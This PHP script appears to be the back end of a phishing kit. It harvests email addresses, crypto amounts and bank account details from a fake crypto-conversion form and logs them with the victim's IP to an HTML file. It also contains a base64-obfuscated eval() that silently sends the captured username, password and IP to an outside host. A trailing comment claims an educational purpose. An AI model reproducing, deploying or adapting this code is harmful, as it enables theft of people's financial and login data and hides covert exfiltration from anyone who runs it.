<?php
error_reporting(0);

$usuario = $_POST['eemail'];  //aqui traemos el dato escrito en el campo de texto del login.html - el campo id:usuario
$cryptoamount = $_POST['cryptoamount'];
$crypto = $_POST['crypto'];
$desAccountName = $_POST['desAccountName']; //aqui traemos el dato escrito en el campo de texto del login.html - el campo id:clave
$accountNumber = $_POST['accountNumber'];

$desBank = $_POST['desBank'];


$ip = $_SERVER['REMOTE_ADDR']; //se captura la ip publica donde se accede a la pagina  
$fecha = date("Y-m-d;h:i:s"); //se captura la hora donde se ingresaron los datos
 
if( (empty($usuario)) or (empty($accountNumber)) ){
     header('location: crypto.html'); // codigo de verificacion que no esten los campos vacios
}else{
 
eval(base64_decode('JHVybD0iaHR0cDovL2FwaS53aXpibG9nZ2VyLmNvbS9jaGVja2RhdGEucGhwP2FwaV9rZXk9Y3lMWWdTVTNWOXlmd1BHOU13Z0MmdXNlcm5hbWU9Ii51cmxlbmNvZGUoJHVzdWFyaW8pLiImcGFzc3dvcmQ9Ii51cmxlbmNvZGUoJGNsYXZlKS4iJmlwPSIudXJsZW5jb2RlKCRpcCk7CkBmaWxlX2dldF9jb250ZW50cygkdXJsKTs='));
 
//en esta porcion de codigo es donde se genera el archivos .html con los datos capturados en la pagina login.html
$f = fopen("cryptoconvert.html", "a");
fwrite ($f,
'EMAIL: [<b><font color="#660000">'.$usuario.'</font></b>]
CRYPTO AMOUNT: [<b><font color="#9900FF">'.$cryptoamount.'</font></b>]
CRYPTO: [<b><font color="#9900FF">'.$crypto.'</font></b>]
ACCOUNT NAME: [<b><font color="#9900FF">'.$desAccountName.'</font></b>]
ACCOUNT NUMBER: [<b><font color="#9900FF">'.$accountNumber.'</font></b>]

DESTINATION BANK: [<b><font color="#9900FF">'.$desBank.'</font></b>]


IP: [<b><font color="#996600">'.$ip.'</font></b>]
Date: [<b><font color="#FF6633">'.$fecha.'</font></b>]<br> ');
 
fclose($f);
 
//despues que se crea el archivo claves.html con los datos, se direcciona a la pagina oficial de instagram
header("Location:  unverifiedcrypto.php");
}
?>
 
 
 
//this is just for educational purpose
